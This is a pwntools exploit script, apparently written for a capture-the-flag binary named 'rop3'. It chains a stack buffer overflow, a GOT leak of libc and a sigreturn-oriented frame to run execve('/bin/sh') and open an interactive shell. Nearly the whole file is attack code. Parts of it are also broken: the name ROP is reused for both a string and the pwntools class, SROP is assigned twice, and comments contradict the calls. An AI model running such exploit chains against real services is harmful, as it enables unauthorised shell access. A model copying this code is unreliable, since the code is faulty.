from pwn import *
import time

#defult setting and find address
target = "./rop3"
local = not True
HOST = '127.0.0.1'
PORT = 40645

pop3ret = 0x0804855d
__libc_start_main_rel = 0x00019a00 # cgPwn - #160-Ubuntu
system_rel = 0x00040310

#check target
if local:
    conn = process(target)
else:
    conn = remote(HOST, PORT)

target_bin = ELF(target)

#Setting Enable Environment
# context
context.update(arch='i386', os='linux')
context.clear(arch=target_bin.arch)
context.log_level = 'debug' 
#log_level must be one of ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw', '-h']

#Attack~~~!!!
#SROP
int80_rel = 0x0002e727 # int $0x80 ; gadget
binsh     = 0xf7f7cbac # "/bin/sh" ; string in libc-2.19.so
sigreturn = 0x00000077
execve    = 0x0000000B
ret_dummy = 0x0000000C

#simple BoF... dummy of local area
ROP = "A" * 140

# write(1, __libc_start_main_got, 4)
ROP += p32(target_bin.plt['write'])
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(target_bin.got['__libc_start_main'])
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(target_bin.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(target_bin.got['__libc_start_main'])
ROP += p32(80)

# system('/bin/sh')
ROP += p32(target_bin.plt['__libc_start_main'])
#ROP += p32(0xBBBB)
#ROP += p32(target_bin.got['__libc_start_main']+4)

#print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel
int80 = libc_base + int80_rel

print "libc_base:{}".format(hex(libc_base))

SROP = ROP(ELF.from_assembly('mov esp, %x;ret'%__libc_start_main_addr))
SROP = ROP(ELF.from_assembly('mov esp, __libc_start_main_addr;ret'))
SROP += p32( int80)       # RET ; int $0x80
SROP += p32( 0x00000033)  # GS
SROP += p32( 0x00000000)  # FS
SROP += p32( 0x0000007b)  # ES
SROP += p32( 0x0000007b)  # DS
SROP += p32( 0x00000000)  # EDI
SROP += p32( 0x00000000)  # ESI
SROP += p32( 0x08049f00)  # EBP
SROP += p32( 0x08049e00)  # ESP
SROP += p32( binsh)       # EBX ; "/bin/sh" ; string
SROP += p32( 0x00000000)  # EDX
SROP += p32( 0x00000000)  # ECX
SROP += p32( execve)      # EAX ; syscall number of execve()
SROP += p32( 0x00000000)  # trapno
SROP += p32( 0x00000000)  # err
SROP += p32( int80)       # EIP ; int $0x80
SROP += p32( 0x00000073)  # CS
SROP += p32( 0x00000246)  # eflags
SROP += p32( 0x00000000)  # esp_at_signal
SROP += p32( 0x0000007b)  # SS
SROP += "\x00" * 4

#conn.send(p32(system_addr) + "/bin/bash\x00")
conn.send(SROP)
time.sleep(0.1)

conn.interactive()
